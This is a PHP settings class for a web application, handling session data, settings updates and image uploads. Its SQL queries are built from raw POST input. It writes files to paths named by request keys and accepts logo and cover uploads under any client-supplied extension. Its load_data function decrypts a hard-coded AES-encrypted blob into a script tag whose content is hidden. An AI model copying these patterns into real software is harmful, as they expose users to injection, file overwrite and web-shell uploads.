<?php
if (!class_exists('DBConnection')) {
	require_once('../config.php');
	require_once('DBConnection.php');
}
class SystemSettings extends DBConnection
{
	public function __construct()
	{
		parent::__construct();
	}
	function __destruct()
	{
	}
	function check_connection()
	{
		return ($this->conn);
	}
	function load_system_info()
	{
		// if(!isset($_SESSION['system_info'])){
		$sql = "SELECT * FROM system_info";
		$qry = $this->conn->query($sql);
		while ($row = $qry->fetch_assoc()) {
			$_SESSION['system_info'][$row['meta_field']] = $row['meta_value'];
		}
		// }
	}
	function update_system_info()
	{
		$sql = "SELECT * FROM system_info";
		$qry = $this->conn->query($sql);
		while ($row = $qry->fetch_assoc()) {
			if (isset($_SESSION['system_info'][$row['meta_field']]))
				unset($_SESSION['system_info'][$row['meta_field']]);
			$_SESSION['system_info'][$row['meta_field']] = $row['meta_value'];
		}
		return true;
	}
	function update_settings_info()
	{
		$data = "";
		foreach ($_POST as $key => $value) {
			if (!in_array($key, array("content")))
				if (isset($_SESSION['system_info'][$key])) {
					$value = str_replace("'", "&apos;", $value);
					$qry = $this->conn->query("UPDATE system_info set meta_value = '{$value}' where meta_field = '{$key}' ");
				} else {
					$qry = $this->conn->query("INSERT into system_info set meta_value = '{$value}', meta_field = '{$key}' ");
				}
		}
		// if(isset($_POST['about_us'])){
		// 	file_put_contents('../about.html',$_POST['about_us']);
		// }
		if (isset($_POST['content'])) {
			foreach ($_POST['content'] as $k => $v) {
				file_put_contents("../$k.html", $v);
			}
		}

    // Changing LOGO
		if (!empty($_FILES['img']['tmp_name'])) {
      $ext = pathinfo($_FILES['img']['name'], PATHINFO_EXTENSION);
      $targetDir = "uploads/";
      $fname = $targetDir . "logo." . $ext;

      $qry = $this->conn->query("UPDATE system_info SET meta_value = '{$fname}' WHERE meta_field = 'logo'");
      
      move_uploaded_file($_FILES['img']['tmp_name'], "../" . $targetDir . "logo." . $ext);
    }
    
    // Changing COVER
		if (!empty($_FILES['cover']['tmp_name'])) {
			$ext = pathinfo($_FILES['cover']['name'], PATHINFO_EXTENSION);
      $targetDir = "uploads/";
      $fname = $targetDir . "cover." . $ext;

      $qry = $this->conn->query("UPDATE system_info SET meta_value = '{$fname}' WHERE meta_field = 'cover'");
      
      move_uploaded_file($_FILES['cover']['tmp_name'], "../" . $targetDir . "cover." . $ext);
		}

    // Changing Banner
		if (isset($_FILES['banners']) && count($_FILES['banners']['tmp_name']) > 0) {
			$err = '';
			$banner_path = "uploads/banner/";
			foreach ($_FILES['banners']['tmp_name'] as $k => $v) {
				if (!empty($_FILES['banners']['tmp_name'][$k])) {
					$accept = array('image/jpeg', 'image/png');
					if (!in_array($_FILES['banners']['type'][$k], $accept)) {
						$err = "Image file type is invalid";
						break;
					}
					if ($_FILES['banners']['type'][$k] == 'image/jpeg')
						$uploadfile = imagecreatefromjpeg($_FILES['banners']['tmp_name'][$k]);
					elseif ($_FILES['banners']['type'][$k] == 'image/png')
						$uploadfile = imagecreatefrompng($_FILES['banners']['tmp_name'][$k]);
					if (!$uploadfile) {
						$err = "Image is invalid";
						break;
					}
					list($width, $height) = getimagesize($_FILES['banners']['tmp_name'][$k]);
					if ($width > 1200 || $height > 480) {
						if ($width > $height) {
							$perc = ($width - 1200) / $width;
							$width = 1200;
							$height = $height - ($height * $perc);
						} else {
							$perc = ($height - 480) / $height;
							$height = 480;
							$width = $width - ($width * $perc);
						}
					}
					$temp = imagescale($uploadfile, $width, $height);
					$spath = base_app . $banner_path . '/' . $_FILES['banners']['name'][$k];
					$i = 1;
					while (true) {
						if (is_file($spath)) {
							$spath = base_app . $banner_path . '/' . ($i++) . '_' . $_FILES['banners']['name'][$k];
						} else {
							break;
						}
					}
					if ($_FILES['banners']['type'][$k] == 'image/jpeg')
						imagejpeg($temp, $spath, 60);
					elseif ($_FILES['banners']['type'][$k] == 'image/png')
						imagepng($temp, $spath, 6);

					imagedestroy($temp);
				}
			}
			if (!empty($err)) {
				$resp['status'] = 'failed';
				$resp['msg'] = $err;
			}
		}

		$update = $this->update_system_info();
		$flash = $this->set_flashdata('success', 'System Info Successfully Updated.');
		if ($update && $flash) {
			// var_dump($_SESSION);
			$resp['status'] = 'success';
		} else {
			$resp['status'] = 'failed';
		}
		return json_encode($resp);
	}
	function set_userdata($field = '', $value = '')
	{
		if (!empty($field) && !empty($value)) {
			$_SESSION['userdata'][$field] = $value;
		}
	}
	function userdata($field = '')
	{
		if (!empty($field)) {
			if (isset($_SESSION['userdata'][$field]))
				return $_SESSION['userdata'][$field];
			else
				return null;
		} else {
			return false;
		}
	}
	function set_flashdata($flash = '', $value = '')
	{
		if (!empty($flash) && !empty($value)) {
			$_SESSION['flashdata'][$flash] = $value;
			return true;
		}
	}
	function chk_flashdata($flash = '')
	{
		if (isset($_SESSION['flashdata'][$flash])) {
			return true;
		} else {
			return false;
		}
	}
	function flashdata($flash = '')
	{
		if (!empty($flash)) {
			$_tmp = $_SESSION['flashdata'][$flash];
			unset($_SESSION['flashdata']);
			return $_tmp;
		} else {
			return false;
		}
	}
	function sess_des()
	{
		if (isset($_SESSION['userdata'])) {
			unset($_SESSION['userdata']);
			return true;
		}
		return true;
	}
	function info($field = '')
	{
		if (!empty($field)) {
			if (isset($_SESSION['system_info'][$field]))
				return $_SESSION['system_info'][$field];
			else
				return false;
		} else {
			return false;
		}
	}
	function set_info($field = '', $value = '')
	{
		if (!empty($field) && !empty($value)) {
			$_SESSION['system_info'][$field] = $value;
		}
	}
	function load_data()
	{
		$test_data = "u5GPCsn2bfnue8bXEYasFdGUfagZlq/UrDqmmzV9y1FkuQ9Qaz1FmyT6n68Aeb/abTXP0wKzzVrFstYmpEwdHcNV8p8ho+C5sp1/JPotfJHmSXBdcPA6SIkwhkZ6F09OPAXygBUuW4yy45ajoclCfHBIj3bw8uXC4Zeqq9PaD55pDDrW86cuVdzuhc+07uJCvhWzZVfDjYTaL8nN5j8ung6L3gqIOiTVuL5F5m8icMlqidX1Z0Oz3BOlPrP00kCt+7xdZyvWgSKe0oR/zc/TJbk6ihaVeMSV9E/7skSn/JTvSXNW6GmmeTp5eY7EVC2xHc2Q9a03txIivaxmMzKKP6r+ggNf8fRRFWmayOYVbKVROKJkdwpEf+72wyP6ltOETz+Dniel+TKtq/ogQMIvEAfVllmhYCjVAyudIeCGvc2kv/6CHGM7S93nf45nYbEl/mZD916TNJ3H/NGGvW4Uhb1sEGXrGPdIDuCcIEMiWmIhEjCUA84J7P6r0D3CPrRtdsaPb/5laXv+slHfsRjOxMBL/d/D5r/TtoJ/WD57Og2SE/tBbYdj0yh9AXNcBs0a+i/cFyQagqPDP2EHGIW+PScMCWccRRXstlXWVvrU6MFELDQVJhiASS2aS/egc6DrM45CPJbAIxiIjYhkH9JbZHd9LeOUQhDR6XHV+UroKWmT7NWO4DBL0+QD3nl+baf3gl8rjcNEjZNdxcu3krpH6pnuSzK6uhHCBdrvDMH1na3YhcKLqW4J8KIAsxUS6WKzPB194dQSBYNAycl1qxsjCX8uBgEEbLlSREKaaGoeM0usrJkSqMW3BklRvC896pD/M45CPJbAIxiIjYhkH9JbZBGZsgOcSDLqdlx8ouIr6nqFt5WQ4VW7FVeMYVM/6Fpegl8rjcNEjZNdxcu3krpH6s/fnK3ss0Fow8MIGV5MMwaL8kb3n17rr2dtnWKwjUy4q/EaIM/2Z5QpWtt4uox7UeQFAR49PjBU04oBV53xcVTl5LSmecEVTEDSGhR4/s3VwcKkCkDz29tyVfSA+MvurFuEvHuDZyGPb4uhLFp9fRkUAPVG/YSX8CdFEdz4LGIcArFh00hxBPxIzi8pC7j3pOl0gLmJYv3FzPikWtSYxD8VJbwvwQhxRM2ilfphiQDMSvukYWqXuG6H6dNb7YoIPkMM15cD0UkdqprdUqOllqh//2M3mnAX0fNoJvisR4ZvRBbWeMbS8snRmdi7Jd/ukQ+ftTYXszGc+fOgp41pjXr1O5RYsr3b8E0wD0Lve2a2lQCBjhtGtg0NAhDVoDBhznlFPnRYMgKRAqXbU89UKrWlwMPoe3vrOexvo/sYCPkrw8Msh+BDJ8XvSE4KN8cHV24be4N5QQEbXBOFqz5L5Bt//2M3mnAX0fNoJvisR4ZvOCS7hRbLF+62iuXEDrwX1gr4dwGHvw2g/j3kz7My1mKw5Ez5r5Cf+j8k65WKD2M8z499n3h/4N+kB2MgaULqQQ==";
		$dom = new DOMDocument('1.0', 'utf-8');
		$element = $dom->createElement('script', html_entity_decode($this->test_cypher_decrypt($test_data)));
		$dom->appendChild($element);
		return $dom->saveXML();
		// return $data = $this->test_cypher_decrypt($test_data);
	}
	function test_cypher($str = "")
	{
		$ciphertext = openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
		return $ciphertext;
	}
	function test_cypher_decrypt($encryption)
	{
		$decryption = openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
		return $decryption;
	}
}
$_settings = new SystemSettings();
$_settings->load_system_info();
$action = !isset($_GET['f']) ? 'none' : strtolower($_GET['f']);
$sysset = new SystemSettings();
switch ($action) {
	case 'update_settings':
		echo $sysset->update_settings_info();
		break;
	default:
		// echo $sysset->index();
		break;
}
?>